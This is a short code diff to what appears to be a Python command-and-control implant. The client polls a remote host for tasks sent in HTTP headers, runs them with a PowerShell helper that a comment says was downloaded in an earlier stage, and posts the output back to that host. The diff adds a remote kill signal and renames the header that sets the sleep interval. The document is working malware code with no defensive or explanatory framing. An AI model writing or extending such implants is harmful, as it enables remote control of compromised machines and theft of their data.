@@ -23,20 +23,23 @@ def connect():
     sleep_time = 2
     while True:
         time.sleep(sleep_time)
-        command, sleeping = check_task()
+        command, sleeping, signal = check_task()
         if sleeping:
             sleep_time = int(sleeping)
         elif command:
             data = execute_powershell(command) # we actually have this function, it has been downloaded in the initial stage
             message = {"command":command, "output": data}
             requests.post(f"http://{target}/results", json=message)
+        elif signal:
+            exit(0)
 
 def check_task():
     try:
         r = requests.get(f"http://{target}/check", timeout=5)
-        sleep = r.headers.get("X-Connection-Close")
+        sleep = r.headers.get("X-Connection-State")
         command = r.headers.get("X-Tasks")
-        return command, sleep
+        signal = r.headers.get("X-Connection-Close")
+        return command, sleep, signal
     except requests.exceptions.Timeout:
         print("The request timed out")
         exit(1)
